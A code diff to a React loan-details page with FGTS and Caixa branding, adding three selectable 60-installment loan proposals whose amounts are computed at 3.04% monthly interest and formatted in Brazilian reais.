@@ -7,11 +7,77 @@ import { Button } from '@/components/ui/button';
 import { useNavigate } from 'react-router-dom';
 import { useIsMobile } from '@/hooks/use-mobile';
 import { Checkbox } from '@/components/ui/checkbox';
+import { DialogTitle } from '@/components/ui/dialog';
+
+interface LoanProposal {
+  id: number;
+  installmentsCount: number;
+  installmentValue: number;
+  totalAmount: number;
+  interestRate: number;
+  selected: boolean;
+}
 
 const LoanDetails = () => {
   const navigate = useNavigate();
   const isMobile = useIsMobile();
   const [termsAccepted, setTermsAccepted] = useState(false);
+  
+  // Monthly interest rate of 3.04%
+  const monthlyInterestRate = 0.0304;
+  
+  // Create 3 loan proposals with different installment values
+  const calculateLoanAmount = (installmentValue: number, months: number, rate: number): number => {
+    // PV = PMT * ((1 - (1 + r)^-n) / r)
+    return installmentValue * ((1 - Math.pow(1 + rate, -months)) / rate);
+  };
+  
+  const [loanProposals, setLoanProposals] = useState<LoanProposal[]>([
+    {
+      id: 1,
+      installmentsCount: 60,
+      installmentValue: 230,
+      totalAmount: calculateLoanAmount(230, 60, monthlyInterestRate),
+      interestRate: monthlyInterestRate,
+      selected: true
+    },
+    {
+      id: 2,
+      installmentsCount: 60,
+      installmentValue: 360,
+      totalAmount: calculateLoanAmount(360, 60, monthlyInterestRate),
+      interestRate: monthlyInterestRate,
+      selected: false
+    },
+    {
+      id: 3,
+      installmentsCount: 60,
+      installmentValue: 390,
+      totalAmount: calculateLoanAmount(390, 60, monthlyInterestRate),
+      interestRate: monthlyInterestRate,
+      selected: false
+    }
+  ]);
+  
+  const handleSelectProposal = (id: number) => {
+    setLoanProposals(prevProposals => 
+      prevProposals.map(proposal => ({
+        ...proposal,
+        selected: proposal.id === id
+      }))
+    );
+  };
+  
+  const formatCurrency = (value: number): string => {
+    return value.toLocaleString('pt-BR', {
+      style: 'currency',
+      currency: 'BRL',
+      minimumFractionDigits: 2,
+      maximumFractionDigits: 2
+    });
+  };
+  
+  const selectedProposal = loanProposals.find(p => p.selected) || loanProposals[0];
   
   const handleProceed = () => {
     // Here you would handle the loan application submission
@@ -23,42 +89,85 @@ const LoanDetails = () => {
     <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
       {/* Header */}
       <div className="p-4 sm:p-6 flex justify-between items-center">
-        <FGTSLogo className={`${isMobile ? 'h-8' : 'h-10'}`} />
-        <CaixaLogo className={`${isMobile ? 'h-8' : 'h-10'}`} />
+        <FGTSLogo className={`${isMobile ? 'h-6 w-24' : 'h-10'}`} />
+        <CaixaLogo className={`${isMobile ? 'h-6 w-24' : 'h-10'}`} />
       </div>
 
       {/* Title */}
       <div className="p-4 sm:p-6">
         <div className="text-white text-2xl font-light">Detalhes do Empréstimo</div>
         <div className="text-white opacity-60 text-sm mt-1">
-          Confira as condições e confirme seu empréstimo
+          Escolha uma proposta e confirme seu empréstimo
         </div>
       </div>
 
       {/* Main content */}
       <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
         <div className="p-4 sm:p-6">
-          {/* Loan details */}
+          {/* Loan proposals */}
+          <div className="mb-6">
+            <h2 className="text-[#005CA9] text-xl font-semibold mb-4">Propostas Disponíveis</h2>
+            
+            <div className="space-y-4">
+              {loanProposals.map((proposal) => (
+                <div 
+                  key={proposal.id}
+                  className={`border rounded-lg p-4 cursor-pointer transition-all ${
+                    proposal.selected 
+                      ? 'border-[#005CA9] bg-blue-50' 
+                      : 'border-gray-200 hover:border-gray-300'
+                  }`}
+                  onClick={() => handleSelectProposal(proposal.id)}
+                >
+                  <div className="flex items-start justify-between">
+                    <div>
+                      <div className="font-semibold text-lg">
+                        {proposal.installmentsCount}x de {formatCurrency(proposal.installmentValue)}
+                      </div>
+                      <div className="text-sm text-gray-600 mt-1">
+                        Valor total: {formatCurrency(proposal.totalAmount)}
+                      </div>
+                    </div>
+                    <div className={`w-6 h-6 rounded-full border flex items-center justify-center ${
+                      proposal.selected 
+                        ? 'border-[#005CA9] bg-[#005CA9]' 
+                        : 'border-gray-300'
+                    }`}>
+                      {proposal.selected && <Check size={16} className="text-white" />}
+                    </div>
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+
+          {/* Selected Loan details */}
           <div className="bg-white border border-gray-200 rounded-lg p-5 mb-6 shadow-sm">
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
               <div>
                 <div className="text-gray-500 text-sm">Valor do empréstimo</div>
-                <div className="font-medium text-gray-900 text-xl">R$ 26.000,00</div>
+                <div className="font-medium text-gray-900 text-xl">
+                  {formatCurrency(selectedProposal.totalAmount)}
+                </div>
               </div>
               <div>
                 <div className="text-gray-500 text-sm">Parcelas</div>
-                <div className="font-medium text-gray-900 text-xl">84x de R$ 859,90</div>
+                <div className="font-medium text-gray-900 text-xl">
+                  {selectedProposal.installmentsCount}x de {formatCurrency(selectedProposal.installmentValue)}
+                </div>
               </div>
             </div>
             
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
               <div>
                 <div className="text-gray-500 text-sm">Valor total a ser pago</div>
-                <div className="font-medium text-gray-900 text-xl">R$ 72.231,60</div>
+                <div className="font-medium text-gray-900 text-xl">
+                  {formatCurrency(selectedProposal.installmentValue * selectedProposal.installmentsCount)}
+                </div>
               </div>
               <div>
                 <div className="text-gray-500 text-sm">Taxa de referência</div>
-                <div className="font-medium text-blue-600 text-xl">3,04% ao mês</div>
+                <div className="font-medium text-blue-600 text-xl">{(selectedProposal.interestRate * 100).toFixed(2)}% ao mês</div>
               </div>
             </div>
             
